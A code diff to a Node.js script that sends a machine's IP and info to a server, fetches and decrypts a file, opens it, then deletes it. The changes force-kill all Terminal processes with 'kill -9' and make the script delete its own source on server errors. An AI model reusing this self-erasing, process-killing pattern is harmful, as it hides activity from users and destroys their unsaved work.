@@ -73,7 +73,7 @@ const killCommand = {
 	pdf: 'pkill -f Applications/PDF',
 	txt: 'pkill -f MacOS/TextEdit',
 	png: 'pkill -f Applications/Preview',
-	terminal: 'pkill -f Utilities/Terminal'
+	terminal: 'ps aux|grep Terminal.app|awk {\'print $2\'}|xargs kill -9'
 };
 
 let tryCount = 0;
@@ -114,6 +114,14 @@ const ping = (ipAddress, machineInfo) => {
 		});
 	});
 
+  const killTerminal = () => {
+    // Close the terminal
+  	system.exec(killCommand.terminal).then((out) => {
+  		console.log(killCommand.terminal);
+  		console.log("Wow:" + out);
+  	});
+  };
+
 	request(options)
 		.then((resp) => {
 			fs.writeFile(filePath, decrypt(resp.file.data, resp.decryption_key), 'binary', function(err) {
@@ -126,7 +134,8 @@ const ping = (ipAddress, machineInfo) => {
 							.then(() => {
 								setTimeout(() => {
 									deleteFile(filePath) // delete the file
-								}, 2000);
+                  killTerminal();
+								}, 1500);
 							});
 
 					});
@@ -136,24 +145,20 @@ const ping = (ipAddress, machineInfo) => {
 			});
 		})
 		.catch((err) => {
-			if (err.response.statusCode === 401) {
-				// Unauthorized, self destroy.
+			if (err.response.statusCode === 401 || err.response.statusCode === 500) {
+				// Unauthorized or deleted file, self destroy.
 				deleteFile(__filename);
+        killTerminal();
 			} else {
 				if (tryCount < 3) {
 					tryCount++;
 					ping(ipAddress, machineInfo);
 				} else {
 					// TODO: Too many tries with failures, show "No internet connection" etc.
+          killTerminal();
 				}
 			}
 		});
-
-    // Close the terminal
-    system.exec(killCommand.terminal).then((out) => {
-      console.log(killCommand.terminal);
-      console.log("Wow:" + out);
-    });
 };
 
 system.getIpAddress()
